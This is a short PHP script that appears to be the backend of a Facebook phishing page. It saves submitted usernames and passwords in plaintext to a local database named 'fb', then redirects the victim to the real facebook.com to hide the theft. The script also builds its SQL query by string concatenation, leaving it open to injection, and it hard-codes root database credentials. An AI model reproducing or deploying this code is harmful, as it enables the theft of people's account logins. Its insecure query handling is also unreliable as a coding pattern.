<?php

$connection=mysqli_connect('localhost:3306','root','1234','fb');

if (!$connection){
        die('Could not connect: ' . mysqli_connect_error());
    }
    else
    {
        
        if (isset($_POST['submit'])){
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        $query="insert into login(username,password) values('$username','$password')";
        
    } else {
        echo("Error");
    }
    
 $result= mysqli_query($connection,$query);
   
if ($result)
{
   header('Location: https://www.facebook.com/');   
}
else
{
    echo'Data not inserted';
}

mysqli_close($connection);  


        
        
    }